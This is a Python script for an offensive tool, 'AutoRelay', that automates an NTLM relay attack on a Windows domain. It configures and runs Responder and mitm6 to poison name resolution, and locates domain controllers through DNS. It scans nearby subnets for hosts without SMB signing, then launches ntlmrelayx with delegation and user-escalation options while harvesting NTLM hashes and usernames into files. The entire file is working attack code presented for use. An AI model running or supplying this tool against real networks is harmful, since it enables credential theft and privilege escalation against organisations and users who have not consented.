#!/usr/bin/env python3

import argparse
import sys
import os
import re
import asyncio
import dns.resolver
import ipaddress
import netifaces
import signal
import tempfile
import subprocess
from termcolor import colored
from subprocess import Popen, PIPE, run
from datetime import datetime
from netaddr import IPNetwork, AddrFormatError
from pathlib import Path
import shutil
from datetime import datetime

class AutoRelay:
    def __init__(self, domain, interface=None, verbose=False):
        self.domain = domain
        self.interface = interface or self.get_default_interface()
        self.local_ip = self.get_local_ip()
        self.dcs = set()
        self.relay_targets = set()
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Setup directory structure
        self.base_dir = Path('relay_toolkit_data')
        self.logs_dir = self.base_dir / 'logs'
        self.hashes_dir = self.base_dir / 'hashes'
        self.work_dir = self.base_dir / f'session_{self.timestamp}'
        
        # Create directories
        for d in [self.logs_dir, self.hashes_dir, self.work_dir]:
            d.mkdir(parents=True, exist_ok=True)
            
        # Log files
        self.smb_targets_file = self.work_dir / 'smb_signing_disabled.txt'
        self.found_users_file = self.work_dir / 'found_users.txt'
        self.found_hashes_file = self.work_dir / 'found_hashes.txt'
        self.found_passwords_file = self.work_dir / 'found_passwords.txt'
        self.shares_file = self.work_dir / 'shares_with_scf.txt'

    def get_default_interface(self):
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            for iface in netifaces.interfaces():
                if not iface.startswith('lo'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        return iface
            return None

    def get_local_ip(self):
        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']

    def setup_responder_config(self):
        """Configure Responder for optimal hash capture"""
        responder_conf = Path('/usr/share/responder/Responder.conf')
        if responder_conf.exists():
            config = responder_conf.read_text()
            config = re.sub(r'SMB = On', 'SMB = Off', config)
            config = re.sub(r'HTTP = On', 'HTTP = Off', config)
            
            # Backup original config
            backup_file = self.work_dir / 'Responder.conf.bak'
            shutil.copy(responder_conf, backup_file)
            
            # Write new config
            responder_conf.write_text(config)  
            print_good("Configured Responder.conf")

    async def monitor_hash_files(self):
        """Monitor Responder output for hashes"""
        responder_dir = Path('/usr/share/responder/logs')
        start_time = datetime.now()
        
        hash_types = [
            'HTTP-NTLMv1-Client',
            'HTTP-NTLMv2-Client', 
            'LDAP-NTLMv1-Client',
            'MSSQL-NTLMv1-Client',
            'MSSQL-NTLMv2-Client',
            'SMB-NTLMv1-Client',
            'SMB-NTLMv2-Client',
            'SMB-NTLMSSPv1-Client',
            'SMB-NTLMSSPv2-Client'
        ]
        
        while True:
            # Check Responder logs  
            for hash_type in hash_types:
                for f in responder_dir.glob(f'{hash_type}-*.txt'):
                    if f.stat().st_mtime > start_time.timestamp():
                        hashes = f.read_text()
                        await self.process_hash(hashes)
                        # Archive processed hash file
                        f.rename(self.hashes_dir / f'{f.stem}_{self.timestamp}{f.suffix}')
                
            await asyncio.sleep(1)

    async def process_hash(self, hash_data):
        """Process and store captured hashes"""
        # Extract user info and hash
        for line in hash_data.splitlines():
            if '::' in line:  # NTLMv2 hash format
                user = line.split(':')[0]
                domain = line.split(':')[2]
                hash_value = ':'.join(line.split(':')[3:])
                
                # Store full hash
                with open(self.found_hashes_file, 'a') as f:
                    f.write(f'{line}\n')
                
                # Store username
                with open(self.found_users_file, 'a') as f:  
                    f.write(f'{domain}\\{user}\n')
                
                print_good(f"Captured hash for {domain}\\{user}")

    async def start_responder(self):
        """Start Responder"""
        cmd = f'responder -I {self.interface} -w -d -v'
        print_info(f'Starting Responder: {cmd}')
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        return proc

    async def start_mitm6(self):
        """Start mitm6"""
        cmd = f'mitm6 -d {self.domain} -i {self.interface}'
        print_info(f'Starting mitm6: {cmd}')
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        return proc

    def kill_processes(self, process_names):
        """Kill processes by name"""
        try:
            for name in process_names:
                subprocess.run(['pkill', '-f', name], stderr=subprocess.DEVNULL)
        except Exception as e:
            print_bad(f"Error killing processes: {e}")

    async def run_command(self, cmd):
        """Run command and print output"""
        print_info(f'Running command: {cmd}')
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        print(stdout.decode())
        print(stderr.decode())

    async def discover_dcs(self):
        """Find domain controllers using DNS queries"""
        print_info(f"Starting DC discovery for domain: {self.domain}")
        
        resolver = dns.resolver.Resolver()
        resolver.lifetime = 3
        
        queries = [
            f'_ldap._tcp.dc._msdcs.{self.domain}',  
            f'_kerberos._tcp.dc._msdcs.{self.domain}',
            f'_gc._tcp.{self.domain}',
        ]
        
        for query in queries:
            try:
                answers = resolver.resolve(query, 'SRV')
                for answer in answers:
                    dc_hostname = str(answer.target).rstrip('.')
                    try:
                        dc_ips = resolver.resolve(dc_hostname, 'A')
                        for ip in dc_ips:
                            self.dcs.add(str(ip))
                            print_good(f'Found DC: {dc_hostname} ({ip})')
                    except Exception as e:
                        print_bad(f"Error resolving DC IP: {e}")
            except Exception as e:
                print_bad(f"Error querying DNS: {e}")

        if self.dcs:
            print_good(f"Found {len(self.dcs)} Domain Controllers")  
        else:
            print_bad("No Domain Controllers found via DNS")

    async def scan_subnets(self):
        """Scan subnets around the discovered DCs for relay targets"""
        subnets = set()
        for dc in self.dcs:
            try:
                ip = ipaddress.ip_address(dc)
                network = ipaddress.ip_network(f'{ip.exploded}/24', strict=False)
                subnets.add(str(network))
            except:
                continue
        
        print_info(f"Scanning {len(subnets)} subnets for relay targets")
        
        for subnet in subnets:
            print_info(f"Scanning subnet {subnet}")
            for ip in IPNetwork(subnet):
                ip_str = str(ip)
                if ip_str.split('.')[-1] in ('0', '255'):
                    continue
                result = await self.scan_host(ip_str)
                if result:
                    self.relay_targets.add(result)
                    
        if self.relay_targets:
            print_good(f"Found {len(self.relay_targets)} relay targets")
        else:
            print_bad("No relay targets found")

    async def scan_host(self, ip):
        """Scan single host for SMB signing status using netexec"""
        cmd = f"netexec smb {ip} --gen-relay-list /dev/stdout"
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL
        )
        stdout, _ = await proc.communicate()
        if ip in stdout.decode():
            print_good(f"Found target with SMB signing disabled: {ip}")
            return ip
        return None

    async def auto_relay(self):
        """Run the full auto relay chain"""  
        try:
            print_info("Starting automatic relay attack chain")
            
            # Setup logging
            self.setup_responder_config()
            
            # Start hash monitoring
            monitor_task = asyncio.create_task(self.monitor_hash_files())
            
            # Start core services
            await self.start_responder()
            await self.start_mitm6()
            
            # Discover targets
            await self.discover_dcs()
            if not self.dcs:
                print_bad("No Domain Controllers found")
                return
            
            print_good(f"Found {len(self.dcs)} Domain Controllers")
            
            # Scan for targets  
            await self.scan_subnets()
            
            if self.relay_targets:
                print_good(f"Found {len(self.relay_targets)} relay targets")
                
                # Write targets to file
                self.smb_targets_file.write_text('\n'.join(self.relay_targets))
                
                # Start relay attacks
                cmd = (f"ntlmrelayx.py -tf {self.smb_targets_file} --smb2support "
                      f"--delegate-access --escalate-user "
                      f"--output-file {self.work_dir}/ntlmrelayx.log")
                await self.run_command(cmd)
                
                print_info("Attack chain running. Press Ctrl+C to stop...")
                while True:
                    await asyncio.sleep(1)
            else:
                print_bad("No relay targets found")

        except KeyboardInterrupt:
            print_info("\nReceived interrupt, cleaning up...")
        except Exception as e:
            print_bad(f"Error during attack chain: {e}")
        finally:
            self.cleanup()
            # Create session summary  
            self.create_summary()

    def create_summary(self):
        """Create summary of attack session"""
        summary = self.work_dir / 'session_summary.txt'
        with open(summary, 'w') as f:
            f.write(f"Relay Toolkit Session Summary - {self.timestamp}\n")
            f.write("-" * 50 + "\n\n")
            
            f.write("Domain Controllers Found:\n")
            for dc in self.dcs:
                f.write(f"- {dc}\n")
            
            f.write("\nRelay Targets Found:\n")
            for target in self.relay_targets:
                f.write(f"- {target}\n")
            
            if self.found_hashes_file.exists():
                f.write("\nHashes Captured:\n")  
                f.write(self.found_hashes_file.read_text())
                
            if self.found_passwords_file.exists():
                f.write("\nPasswords Found:\n")
                f.write(self.found_passwords_file.read_text())

    def cleanup(self):
        """Cleanup processes and create final report"""
        print_info("Cleaning up...")
        
        # Kill processes
        self.kill_processes(['responder', 'mitm6', 'ntlmrelayx.py'])
        
        # Archive logs
        if Path('/usr/share/responder/logs').exists():
            for f in Path('/usr/share/responder/logs').glob('*.txt'):
                shutil.move(f, self.logs_dir / f'{f.stem}_{self.timestamp}{f.suffix}')
                
        # Create zip of session
        shutil.make_archive(
            f'relay_toolkit_session_{self.timestamp}',
            'zip',
            self.work_dir  
        )

def parse_args():
    parser = argparse.ArgumentParser(description='Find and auto-attack SMB relay targets')
    parser.add_argument("-d", "--domain", required=True, help="Domain to attack (e.g. domain.local)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--auto", action="store_true", help="Enable automatic attack chain")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)
    
def print_good(msg):
    print(colored('[+] ', 'green') + msg)

async def main():
    args = parse_args()
    
    if os.geteuid():
        print_bad('Script must be run as root')
        sys.exit(1)

    if args.auto:
        relay = AutoRelay(args.domain, args.interface, args.verbose)
        await relay.auto_relay()
    else:
        print_bad("Please use --auto for automatic attack chain")
        
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_info("\nExiting...")
    except Exception as e:
        print_bad(f"Fatal error: {e}")
